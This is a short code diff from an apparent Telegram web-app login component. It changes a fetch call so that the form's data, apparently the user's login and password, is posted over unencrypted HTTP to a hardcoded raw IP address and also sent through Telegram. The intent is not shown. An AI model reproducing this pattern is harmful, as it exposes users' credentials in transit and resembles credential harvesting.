@@ -40,13 +40,13 @@ const Auth = () => {
         //     body: JSON.stringify(data)
         // })
         fetch('http://188.247.115.178:30020/web-data', {
-        method: 'POST',
-        headers: {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({ "id": 78912 })
-    }),
+            method: 'POST',
+            headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        }),
         // fetch(sendTel+JSON.stringify(data))
         tg.sendData(JSON.stringify(data));
     }, [login, password, /*subject*/])
